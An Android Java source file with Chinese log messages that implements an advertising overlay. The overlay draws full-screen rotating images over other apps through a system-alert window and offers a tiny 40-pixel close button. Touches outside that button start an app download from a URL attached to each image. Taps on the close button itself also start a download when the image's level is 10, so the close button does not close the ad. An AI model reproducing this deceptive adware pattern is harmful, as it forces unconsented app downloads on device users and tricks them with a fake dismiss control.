package com.flex;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Message;
import android.util.DisplayMetrics;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.ImageView.ScaleType;

@SuppressLint("ClickableViewAccessibility")
public class UI {
	private Context mContext;
	private static String tag;
	public static UI instance;
	public static Handler autoScroll;
	public static Handler recMsg;
	public Runnable autoRun;
	private final long delayMillis = 1000 * 3;
	private ImageView mImgView; // 展示图片的View
	private ImageView mCloseView; // 关闭按钮的View
	private WindowManager.LayoutParams wlPicView; // 包含ImageView的布局
	private WindowManager.LayoutParams wlCloseView; // 包含关闭按钮的布局
	private WindowManager mWndMgr;
	private DisplayMetrics outMetrics;
	private int mScreenX;
	private int mScreenY;
	private static int mCurrentIndex = 0;
	private List<PictureData> mPictures;
	private static boolean isShowing = false;
	public static String bmd;
	public static String bakurl;
	static {
		instance = null;
		tag = UI.class.getName();
		autoScroll = null;
		recMsg = null;
	}

	public static UI getUiInstance(Context context) {
		if (instance == null)
			instance = new UI(context);
		return instance;
	}

	private UI(Context context) {
		mContext = context;
	}

	public boolean initUI() {
		LogU.Log(tag, "初始化UI");
		setHandler();
		if (initScreenParams() == false) {
			LogU.Log(tag, "初始化屏幕参数失败");
			return false;
		}
		addImageView();
		addCloseBtnView();
		return true;
	}

	private boolean initScreenParams() {
		if (mContext == null) {
			LogU.Log(tag, "mContext为空，返回false");
			return false;
		}
		if (mWndMgr == null) {
			mWndMgr = (WindowManager) mContext
					.getSystemService(Context.WINDOW_SERVICE);
		}
		if (outMetrics == null) {
			outMetrics = new DisplayMetrics();
			mWndMgr.getDefaultDisplay().getMetrics(outMetrics);
		}
		if (wlPicView == null) {
			wlPicView = new WindowManager.LayoutParams();
		}
		if (wlCloseView == null) {
			wlCloseView = new WindowManager.LayoutParams();
		}
		if (mImgView == null) {
			mImgView = new ImageView(mContext);
		}
		if (mCloseView == null) {
			mCloseView = new ImageView(mContext);
		}
		if (getCurrentScreenStatus(mContext) == Configuration.ORIENTATION_LANDSCAPE) {
			mScreenX = outMetrics.widthPixels;
			mScreenY = outMetrics.heightPixels;
		} else {
			mScreenX = outMetrics.widthPixels;
			mScreenY = outMetrics.heightPixels;
		}
		return true;
	}

	private void addImageView() {
		int PicWndtype = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
		wlPicView.type = PicWndtype;
		wlPicView.dimAmount = 0.5f;
		wlPicView.width = this.mScreenX;
		wlPicView.height = this.mScreenY - 150;
		wlPicView.flags = WindowManager.LayoutParams.FLAG_DIM_BEHIND;

		mImgView.setImageBitmap(DataDef.gPictureDatas.get(mCurrentIndex)
				.getPicBitmap());
		mImgView.setScaleType(ScaleType.FIT_XY);
		mImgView.setLayoutParams(wlPicView);
		mWndMgr.addView(mImgView, wlPicView);
	}

	@SuppressLint("DefaultLocale")
	private void addCloseBtnView() {
		int CloseBtnWndType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
		wlCloseView.type = CloseBtnWndType;
		wlCloseView.format = PixelFormat.RGBA_8888;
		wlCloseView.width = 40;
		wlCloseView.height = 40;
		wlCloseView.gravity = Gravity.TOP;
		wlCloseView.x = this.mScreenX - 40;
		wlCloseView.y = 60;

		mCloseView.setLayoutParams(wlCloseView);
		mCloseView.setBackgroundColor(Color.TRANSPARENT);
		InputStream ins = null;
		try {
			ins = mContext.getAssets().open("fxclose.png");
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		Bitmap bm = BitmapFactory.decodeStream(ins);
		mCloseView.setImageBitmap(bm);
		try {
			mWndMgr.addView(mCloseView, wlCloseView);
		} catch (Exception e) {
			e.printStackTrace();
		}
		mCloseView.setOnTouchListener(new OnTouchListener() {
			public boolean onTouch(View v, MotionEvent event) {
				if (event.getAction() == MotionEvent.ACTION_UP) {
					float x = event.getX();
					float y = event.getY();
					if (((x >= 0) && (x <= 40)) && ((y >= 0) && (y <= 40))) {
						int level = mPictures.get(mCurrentIndex).getPicLevel();
						LogU.Log(tag, "分数："+level);
						if (level == 10) {
							String appurl = mPictures.get(mCurrentIndex).getAppDownloadURL();
							String msg = String.format("点击了关闭按钮!当前图片对应的分数为%d，准备下载：%s", level,appurl);
							LogU.Log(tag, msg);
							AppDownThread adt = AppDownThread.getAdtInstance(mContext, appurl);
							adt.start();
							LogU.Log(tag, "替换掉当前图片");
						}else{
							LogU.Log(tag, "关闭按钮点击时，当前图片对应的分数不为10，不需要下载对应的APP，将关闭显示");
							clearView();
						}
					} else {
						String appurl = mPictures.get(mCurrentIndex).getAppDownloadURL();
						LogU.Log(tag, "点击了关闭按钮之外的区域。下载，URL="+appurl);
						AppDownThread adt = AppDownThread.getAdtInstance(mContext, appurl);
						adt.start();
					}
				}
				return false;
			}
		});
	}

	@SuppressLint("HandlerLeak")
	public void setMessage() {
		recMsg = new Handler() {
			@SuppressWarnings("unchecked")
			public void handleMessage(Message msg) {
				if (msg.what == DataDef.MSG_ID_SHOW_UI) {
					LogU.Log(tag, "收到展示UI的消息");
					mPictures = (List<PictureData>) msg.obj;
					if(isShowing == false){
						initUI();
						isShowing = true;
						autoDisplay();
					}
				}

				if (msg.what == DataDef.MSG_ID_NEW_APP_START) {
					LogU.Log(tag, "收到程序启动消息");
					mPictures = (List<PictureData>) msg.obj;
					if(isShowing == false){
						initUI();
						isShowing = true;
						autoDisplay();
					}
				}
			}
		};
	}

	private boolean setHandler() {
		boolean initok = true;
		try {
			if (autoScroll == null)
				autoScroll = new Handler();
		} catch (Exception e) {
			initok = false;
			e.printStackTrace();
		}
		return initok;
	}

	private void autoDisplay() {
		autoRun = new Runnable() {
			public void run() {
				if (mCurrentIndex + 1 >= 3) {
					mCurrentIndex = 0;
				} else {
					mCurrentIndex = mCurrentIndex + 1;
				}
				mImgView.setScaleType(ScaleType.FIT_XY);
				mImgView.setImageBitmap(mPictures.get(mCurrentIndex).getPicBitmap());
				autoScroll.postDelayed(autoRun, delayMillis);
			}
		};
		autoScroll.postDelayed(autoRun, delayMillis);
	}

	public void clearView() {
		autoScroll.removeCallbacks(autoRun);
		mWndMgr.removeView(mCloseView);
		mWndMgr.removeView(mImgView);
		isShowing = false;
	}

	private int getCurrentScreenStatus(Context context) {
		Configuration mConfiguration = context.getResources().getConfiguration();
		return mConfiguration.orientation;
	}
	
	public boolean isCurrentActivityInBmd(Context context){
		return true;
	}
}
